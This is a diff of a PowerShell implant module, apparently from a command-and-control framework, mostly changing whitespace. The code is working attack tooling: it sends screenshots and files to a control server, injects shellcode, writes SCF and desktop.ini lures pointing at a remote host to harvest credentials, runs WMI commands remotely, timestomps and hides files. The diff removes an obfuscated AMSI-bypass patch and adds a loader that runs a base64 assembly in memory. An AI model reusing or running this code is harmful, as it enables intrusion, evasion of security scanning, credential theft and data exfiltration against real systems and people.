@@ -9,18 +9,18 @@ function Test-Win32() {
 }
 
 Function Turtle($sleeptime) {
-    if ($sleeptime.ToLower().Contains('m')) { 
+    if ($sleeptime.ToLower().Contains('m')) {
         $sleeptime = $sleeptime -replace 'm', ''
-        [int]$newsleep = $sleeptime 
+        [int]$newsleep = $sleeptime
         [int]$newsleep = $newsleep * 60
     }
-    elseif ($sleeptime.ToLower().Contains('h')) { 
+    elseif ($sleeptime.ToLower().Contains('h')) {
         $sleeptime = $sleeptime -replace 'h', ''
-        [int]$newsleep1 = $sleeptime 
+        [int]$newsleep1 = $sleeptime
         [int]$newsleep2 = $newsleep1 * 60
         [int]$newsleep = $newsleep2 * 60
     }
-    elseif ($sleeptime.ToLower().Contains('s')) { 
+    elseif ($sleeptime.ToLower().Contains('s')) {
         $newsleep = $sleeptime -replace 's', ''
     } else {
         $newsleep = $sleeptime
@@ -42,12 +42,12 @@ Function CheckArchitecture
     else {
         Write-Output "Unknown Architecture Detected"
     }
-    get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`n[+] AMSI Detected. Run Unhook-AMSI to unload Anti-Malware Scan Interface (AMSI)"} }
+    get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`n[+] AMSI Detected. Migrate to avoid the Anti-Malware Scan Interface (AMSI)"} }
 }
 Function Get-Proxy {
     Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 }
-Function CheckVersionTwo 
+Function CheckVersionTwo
 {
     $psver = $PSVersionTable.psversion.Major
     if ($psver -ne '2') {
@@ -74,15 +74,15 @@ Function StartAnotherImplant {
 sal S StartAnotherImplant
 sal SAI StartAnotherImplant
 sal invoke-smblogin invoke-smbexec
-Function Invoke-DowngradeAttack 
+Function Invoke-DowngradeAttack
 {
     $payload = $payload -replace "-exec", "-v 2 -exec"
     StartAnotherImplant
 }
-function Test-Administrator  
-{  
+function Test-Administrator
+{
     $user = [Security.Principal.WindowsIdentity]::GetCurrent();
-    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
+    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
 }
 function Check-Command($cmdname)
 {
@@ -103,9 +103,9 @@ function EnableRDP
 {
     if (Test-Administrator) {
         set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1   
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
         $psver = $PSVersionTable.psversion.Major
-        if ($psver -ne '2') 
+        if ($psver -ne '2')
         {
             Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled true
         } else {
@@ -119,9 +119,9 @@ function DisableRDP
 {
     if (Test-Administrator) {
         set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 1
-        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0 
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
         $psver = $PSVersionTable.psversion.Major
-        if ($psver -ne '2') 
+        if ($psver -ne '2')
         {
             Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled false
         } else {
@@ -131,17 +131,17 @@ function DisableRDP
     Write-Output "You are not elevated to Administator "
     }
 }
-function Write-SCFFile 
+function Write-SCFFile
 {
     Param ($IPaddress, $Location)
     "[Shell]" >$Location\~T0P0092.jpg.scf
-    "Command=2" >> $Location\~T0P0092.jpg.scf; 
-    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.jpg.scf; 
-    "[Taskbar]" >> $Location\~T0P0092.jpg.scf; 
-    "Command=ToggleDesktop" >> $Location\~T0P0092.jpg.scf; 
+    "Command=2" >> $Location\~T0P0092.jpg.scf;
+    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.jpg.scf;
+    "[Taskbar]" >> $Location\~T0P0092.jpg.scf;
+    "Command=ToggleDesktop" >> $Location\~T0P0092.jpg.scf;
     Write-Output "Written SCF File: $Location\~T0P0092.jpg.scf"
 }
-function Write-INIFile 
+function Write-INIFile
 {
     Param ($IPaddress, $Location)
     "[.ShellClassInfo]" > $Location\desktop.ini
@@ -221,12 +221,12 @@ Function RemoveExe-Persistence() {
         If (Test-Path $DestinationPath1) {
             Remove-Item -Force $DestinationPath1
         }
-        
+
         $DestinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
         If (Test-Path $DestinationPath2) {
             Remove-Item -Force $DestinationPath2
         }
-        
+
         If ((Test-Path $DestinationPath1) -or ((Test-Path $DestinationPath2))) {
             Write-Output "Unable to Remove Persistence"
         } else {
@@ -272,7 +272,7 @@ Function Remove-Persistence
     }
 }
 }
-Function Web-Upload-File 
+Function Web-Upload-File
 {
     Param
     (
@@ -299,16 +299,16 @@ function ConvertFrom-Base64
         [string] $SourceFilePath,
         [string] $TargetFilePath
     )
- 
+
     $SourceFilePath = Resolve-PathSafe $SourceFilePath
     $TargetFilePath = Resolve-PathSafe $TargetFilePath
- 
+
     $bufferSize = 90000
     $buffer = New-Object char[] $bufferSize
-     
+
     $reader = [System.IO.File]::OpenText($SourceFilePath)
     $writer = [System.IO.File]::OpenWrite($TargetFilePath)
-     
+
     $bytesRead = 0
     do
     {
@@ -316,7 +316,7 @@ function ConvertFrom-Base64
         $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
         $writer.Write($bytes, 0, $bytes.Length);
     } while ($bytesRead -eq $bufferSize);
-     
+
     $reader.Dispose()
     $writer.Dispose()
 }
@@ -336,20 +336,20 @@ Function Get-ScreenshotMulti {
     param($Timedelay, $Quantity, [string] $TaskId)
 
     if ($Quantity -and $Timedelay) {
-        ForEach ($number in 1..[int]$Quantity ) { 
+        ForEach ($number in 1..[int]$Quantity ) {
             try { $Output = Get-Screenshot } catch { $Output = $null }
             try {
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
             $eid = Encrypt-String $key $TaskId
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
-                
-            } catch {}      
+
+            } catch {}
             Start-Sleep $Timedelay
         }
     }
 }
-Function Get-Screenshot 
+Function Get-Screenshot
 {
     param($File)
 
@@ -375,7 +375,7 @@ Function Get-Screenshot
 
     # Send back as base64
     $msimage = New-Object IO.MemoryStream
-    
+
     if ($File) {
         $bitmap.save($file, "png")
     } else {
@@ -421,22 +421,22 @@ function Download-Files
     param
     (
         [string] $Directory, [string] $TaskId
-    ) 
+    )
     $files = Get-ChildItem $Directory -Recurse | Where-Object{!($_.PSIsContainer)}
     foreach ($item in $files)
     {
         Download-File -Source $item.FullName -TaskId $TaskId
-    } 
+    }
 }
-function Get-RandomName 
+function Get-RandomName
 {
-    param 
+    param
     (
         [int]$Length
     )
     $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
     $result = ''
-    for ($x = 0; $x -lt $Length; $x++) 
+    for ($x = 0; $x -lt $Length; $x++)
     {$result += $set | Get-Random}
     return $result
 }
@@ -454,8 +454,8 @@ function Download-File
         $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
         $fullNewname = $Source
         $bufferSize = 10737418;
-        $fs = [System.IO.File]::OpenRead($fileName);  
-        $fileSize =(Get-Item $fileName).Length       
+        $fs = [System.IO.File]::OpenRead($fileName);
+        $fileSize =(Get-Item $fileName).Length
         $chunkSize = $fileSize / $bufferSize
         $totalChunks = [int][Math]::Ceiling($chunkSize)
         if ($totalChunks -lt 1) {$totalChunks = 1}
@@ -473,13 +473,13 @@ function Download-File
             $ChunkStr = $Chunk.ToString("00000")
             $ChunkedByte = [System.Text.Encoding]::UTF8.GetBytes($ChunkStr)
             $preNumbers = New-Object byte[] 10
-            $preNumbers = ($ChunkedByte+$totalChunkByte)           
+            $preNumbers = ($ChunkedByte+$totalChunkByte)
             $eid = Encrypt-String $key $TaskId
             $send = Encrypt-Bytes $key ($preNumbers+$str.ToArray())
             $UploadBytes = getimgdata $send
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
             $str.SetLength(0);
-            ++$Chunk 
+            ++$Chunk
         } until (($size -= $bufferSize) -le 0);
     } catch {
         $Output = "ErrorDownload: " + $error[0]
@@ -500,7 +500,7 @@ function Posh-Delete
     try {
     $file = Get-Item $Destination -Force
     $file.Attributes = "Normal"
-    $content = New-Object Byte[] $file.length 
+    $content = New-Object Byte[] $file.length
     (New-Object Random).NextBytes($content)
     [IO.File]::WriteAllBytes($file,$content)
     Remove-Item $Destination -Force
@@ -508,7 +508,7 @@ function Posh-Delete
     echo $error[0]
     }
 }
-function Upload-File 
+function Upload-File
 {
     param
     (
@@ -529,7 +529,7 @@ function Upload-File
         if ($NotHidden -eq $true) {
             $fileBytes = [Convert]::FromBase64String($Base64)
             if ($Stream){
-                set-content -path $Destination -value $fileBytes -stream $Stream -encoding byte 
+                set-content -path $Destination -value $fileBytes -stream $Stream -encoding byte
             } else {
                 [io.file]::WriteAllBytes($Destination, $fileBytes)
             }
@@ -541,7 +541,7 @@ function Upload-File
             $file = Get-Item $Destination -Force
             $attrib = $file.Attributes
             $attrib = "Hidden,System"
-            $file.Attributes = $attrib  
+            $file.Attributes = $attrib
             write-output "Run Get-ChildItem -Force to view the uploaded files"
         }
 
@@ -549,7 +549,7 @@ function Upload-File
 
         echo $error[0]
 
-    }  
+    }
 }
 Function UnHideFile ($file) {
     $f = Get-Item "$file" -Force
@@ -569,7 +569,7 @@ function Resolve-PathSafe
     (
         [string] $Path
     )
-      
+
     $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
 }
 function EnableWinRM {
@@ -621,7 +621,7 @@ $PSS = ConvertTo-SecureString $password -AsPlainText -Force
 $getcreds = new-object system.management.automation.PSCredential $username,$PSS
 $WMIResult = Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
 If ($WMIResult.Returnvalue -eq 0) {
-    Write-Output "Executed WMI Command with Sucess: $Command `n" 
+    Write-Output "Executed WMI Command with Sucess: $Command `n"
 } else {
     Write-Output "WMI Command Failed - Could be due to permissions or UAC is enabled on the remote host, Try mounting the C$ share to check administrative access to the host"
 }
@@ -745,22 +745,22 @@ try{
     echo $error[0]
 }
 }
-Function Invoke-Netstat {                       
-try {            
-    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
-    $Connections = $TCPProperties.GetActiveTcpListeners()            
-    foreach($Connection in $Connections) {            
+Function Invoke-Netstat {
+try {
+    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
+    $Connections = $TCPProperties.GetActiveTcpListeners()
+    foreach($Connection in $Connections) {
         if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
-        $OutputObj = New-Object -TypeName PSobject            
-        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
-        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
-        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
-        $OutputObj            
-    }            
-            
-} catch {            
-    Write-Error "Failed to get listening connections. $_"            
-}           
+        $OutputObj = New-Object -TypeName PSobject
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType
+        $OutputObj
+    }
+
+} catch {
+    Write-Error "Failed to get listening connections. $_"
+}
 }
 Function Get-Webpage {
     param (
@@ -768,9 +768,9 @@ Function Get-Webpage {
         [string] $TaskId
     )
     $file = (New-Object System.Net.Webclient).DownloadString($url)|Out-String
-    $eid = Encrypt-String $key $TaskId 
+    $eid = Encrypt-String $key $TaskId
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($file)
-    $base64 = [Convert]::ToBase64String($bytes)  
+    $base64 = [Convert]::ToBase64String($bytes)
     $Output = Encrypt-String2 $key $base64
     $UploadBytes = getimgdata $Output
     (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
@@ -781,7 +781,7 @@ if (($p = Get-Process | ? {$_.id -eq $pid}).name -eq "powershell") {
 }
 if ($t -and [IntPtr]::size -eq 8){
    Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
-} 
+}
 elseif (($t -and [IntPtr]::size -eq 4)) {
     Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
 }
@@ -789,13 +789,13 @@ elseif (($t -and [IntPtr]::size -eq 4)) {
 Function AutoMigrate-Always {
 if ([IntPtr]::size -eq 8){
    Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
-} 
+}
 elseif ([IntPtr]::size -eq 4) {
     Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
 }
 }
 Function TimeStomp($File, $Date) {
-    $file=(gi $file -force) 
+    $file=(gi $file -force)
     $file.LastWriteTime=$date;
     $file.LastAccessTime=$date;
     $file.CreationTime=$date;
@@ -817,55 +817,46 @@ Function Get-AllFirewallRules($path) {
     }
 }
 
-Function Unhook {
-    
-$win32 = @"
-using System.Runtime.InteropServices;
-using System;
-public class Unhook 
+$script:genurl=${function:GenerateURL}
+$script:sendresp=${function:Send-ResponseAsync}
+$script:sendrespkey=${variable:key}
+
+function loadCompressedAsm()
 {
-    [DllImport("kernel32")]
-    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-    static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
-
-    public static void Disable()
+    Param ( [string]$cmpdAsm )
+    try
     {
-        var one = "i.dll";
-        var two = "a";
-        var three = "ms";
-        var dll = LoadLibrary(two + three + one);
-        if (dll == IntPtr.Zero)
+        $Delay = $Delay *1000
+        if (![String]::IsNullOrEmpty($cmpdAsm))
         {
-            return;
+            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream(45000)
+            [System.IO.MemoryStream] $gzdll = New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String($cmpdAsm))
+            $gzipStream = New-Object System.IO.Compression.GzipStream $gzdll, ([IO.Compression.CompressionMode]::Decompress)
+            try
+            {
+                $buffer = New-Object byte[](32000);
+                while($true)
+                {
+                    $read=$gzipStream.Read($buffer, 0, 32000)
+                    if($read -le 0) {break}
+                    $output.Write($buffer, 0, $read)
+                }
+            }
+            finally
+            {
+                $gzipStream.Close()
+                $output.Close()
+                $gzdll.Close()
+            }
+            return [System.Reflection.Assembly]::Load($output.ToArray());
         }
-        var four = "nBuffer";
-        var five = "Ams";
-        var six = "iSca";
-        var proc = GetProcAddress(dll, five + six + four);
-        if (proc == IntPtr.Zero)
+        else
         {
-            return;
+            return $null;
         }
-        var n = new byte[] { 0xb8,  0x00, 0x00, 0x00, 0x02, 0xc3 };
-        UIntPtr dwSize = (UIntPtr) n.Length;
-        uint old = 0;
-        if (!VirtualProtect(proc, dwSize, 0x40, out old))
-        {
-            return;
-        }
-        
-        Marshal.Copy(n, 0, proc, n.Length);
-        VirtualProtect(proc, dwSize, old, out old);
     }
-
-}
-"@
-Add-Type $win32
-$ptr = [Unhook]::Disable()
+    catch
+    {
+        return $null;
+    }
 }
